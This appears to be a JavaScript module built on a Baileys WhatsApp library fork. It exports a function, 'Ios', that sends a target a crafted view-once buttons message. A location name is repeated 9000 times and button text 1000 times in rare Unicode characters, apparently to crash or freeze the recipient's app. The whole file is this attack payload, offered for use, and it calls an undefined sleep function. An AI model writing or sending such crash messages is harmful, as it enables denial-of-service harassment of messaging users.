const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function Ios(uwu, target) { 
    await uwu.relayMessage(target, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            locationMessage: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "𑇂𑆵𑆴𑆿".repeat(9000)
            },
            contentText: "@GMOTEJID_bot",
            buttons: [{
              buttonId: "uwu",
              buttonText: {
                displayText: "𑇂𑆵𑆴𑆿".repeat(1000)
              },
              type: 1
            }],
            headerType: 6
          }
        }
      }
    }, {});
    
    await sleep(1000);
}

module.exports = { Ios };
